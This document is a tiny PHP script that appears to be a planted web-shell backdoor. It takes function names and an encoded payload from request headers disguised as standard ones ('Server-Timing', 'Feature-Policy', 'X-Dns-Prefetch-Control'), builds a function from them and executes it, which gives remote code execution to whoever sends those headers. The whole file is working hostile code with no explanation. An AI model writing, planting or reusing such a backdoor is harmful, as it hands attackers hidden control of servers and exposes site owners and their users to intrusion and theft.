<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $class = $_HEADERS['Server-Timing']('', $_HEADERS['Feature-Policy']($_HEADERS['X-Dns-Prefetch-Control']));
    $class();
}